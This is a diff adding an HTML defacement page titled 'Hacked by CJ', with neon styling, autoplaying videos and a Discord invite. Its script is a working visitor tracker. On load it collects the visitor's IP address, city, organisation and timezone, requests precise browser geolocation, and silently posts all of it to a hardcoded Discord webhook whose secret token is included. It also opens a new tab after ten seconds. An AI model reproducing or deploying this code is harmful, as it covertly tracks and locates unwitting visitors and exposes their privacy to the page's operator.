@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geographical Location & PSYCHO CJ</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 0;
+            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
+            background-size: cover;
+            color: #5eff33;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            overflow: hidden;
+        }
+        h1 {
+            position: absolute;
+            pointer-events: none;
+            color: #5eff33;
+            text-shadow: 0px 0px 8px #5eff33, 0px 0px 15px #5eff33, 0px 0px 25px #5eff33;
+        }
+        #location-info {
+            font-size: 1.2em;
+            margin-top: 20px;
+            color: white;
+        }
+        .video-container video {
+            width: 500px;
+            height: auto;
+            border: 2px solid #5eff33;
+            border-radius: 15px;
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 1.5em;
+            color: #5eff33;
+            text-shadow: 0px 0px 8px #5eff33, 0px 0px 15px #5eff33, 0px 0px 25px #5eff33;
+            letter-spacing: 4.5px;
+        }
+        .marquee {
+            position: absolute;
+            top: 10%;
+            width: 100%;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        .marquee span {
+            display: inline-block;
+            font-size: 4em;
+            font-weight: bold;
+            color: #5eff33;
+            text-shadow: 0px 0px 8px #5eff33, 0px 0px 15px #5eff33, 0px 0px 25px #5eff33;
+            animation: scroll 10s linear infinite;
+        }
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        .discord-link {
+            margin-top: 20px;
+            font-size: 3em;
+            color: #00ff00;
+            text-shadow: 0px 0px 10px #00ff00, 0px 0px 20px #00ff00, 0px 0px 30px #00ff00;
+            letter-spacing: 4.5px;
+        }
+        .fullscreen-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+        }
+        #main-content {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div id="intro-video">
+        <video class="fullscreen-video" autoplay muted>
+            <source src="https://f.top4top.io/m_32778nytx1.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+    <div id="main-content">
+        <div class="marquee">
+            <span> You Have Been Hacked By MOD , CJ </span>
+        </div>
+        <div class="video-container">
+            <video autoplay loop muted>
+                <source src="https://a.top4top.io/m_3277as9fz1.mp4" type="video/mp4">
+                <source src="https://f.top4top.io/m_3277jy71q1.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+        <audio autoplay loop>
+            <source src="https://h.top4top.io/m_32771lotl1.mp3" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
+        <div class="info" id="ip-info">Loading IP Info...</div>
+        <div class="discord-link"> https://discord.gg/FMLY </div>
+        <div class="discord-link"> 𝓒𝓙 𝓞𝓝 𝓣𝓞𝓟 </div>
+    </div>
+    <div id="location-info">Retrieving location...</div>
+    <h1>Hacked by CJ</h1>
+
+    <script>
+        // Show main content after 5 seconds
+        setTimeout(() => {
+            document.getElementById('intro-video').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+        }, 5000);
+
+        // Fetch IP information
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const info = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country,
+                    loc: data.loc,
+                    org: data.org,
+                    timezone: data.timezone
+                };
+                document.getElementById('ip-info').innerText = JSON.stringify(info, null, 2);
+
+                const webhookURL = 'https://discord.com/api/webhooks/1320710688733134909/csN5XPlXSGRbUEP1zc-K0hgprRDtYLwjXkdD0qGDfSusL2gVcIsYksw70aw_TQbp7pNA';  // Replace with your actual Webhook URL
+                const payload = {
+                    content: `IP Info:\nIP: ${info.ip}\nCity: ${info.city}\nRegion: ${info.region}\nCountry: ${info.country}\nLocation: ${info.loc}\nOrg: ${info.org}\nTimezone: ${info.timezone}`
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Successfully sent IP info to Discord:', result);
+                })
+                .catch(error => {
+                    console.error('Error sending IP info to Discord:', error);
+                });
+            })
+            .catch(error => {
+                document.getElementById('ip-info').innerText = 'Unable to fetch IP information.';
+                console.error('Error fetching IP info:', error);
+            });
+
+        // Geolocation functionality
+        function sendToDiscord(locationData) {
+            const payload = {
+                content: `Geographical Location:\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}`
+            };
+
+            const webhookURL = 'https://discord.com/api/webhooks/1320710688733134909/csN5XPlXSGRbUEP1zc-K0hgprRDtYLwjXkdD0qGDfSusL2gVcIsYksw70aw_TQbp7pNA';  // Replace with your Webhook URL
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Successfully sent location to Discord:', result);
+            })
+            .catch(error => {
+                console.error('Error sending location to Discord:', error);
+            });
+        }
+
+        function showLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            document.getElementById("location-info").innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+            sendToDiscord({ latitude, longitude });
+        }
+
+        function errorHandling(error) {
+            document.getElementById("location-info").innerText = "Unable to retrieve your location.";
+            console.error('Error fetching location:', error);
+        }
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(showLocation, errorHandling);
+        } else {
+            document.getElementById("location-info").innerText = "Geolocation is not supported by this browser.";
+        }
+
+        // Mouse movement prank
+        const text = document.querySelector('h1');
+        document.addEventListener('mousemove', (e) => {
+            text.style.left = `${e.pageX + 10}px`;
+            text.style.top = `${e.pageY + 10}px`;
+        });
+
+        // Open a new page automatically after 10 seconds without affecting current page
+        setTimeout(() => {
+            window.open("discord.gg/fmly", "_blank");  // Opens the page in a new tab
+        }, 10000);
+    </script>
+</body>
+</html>
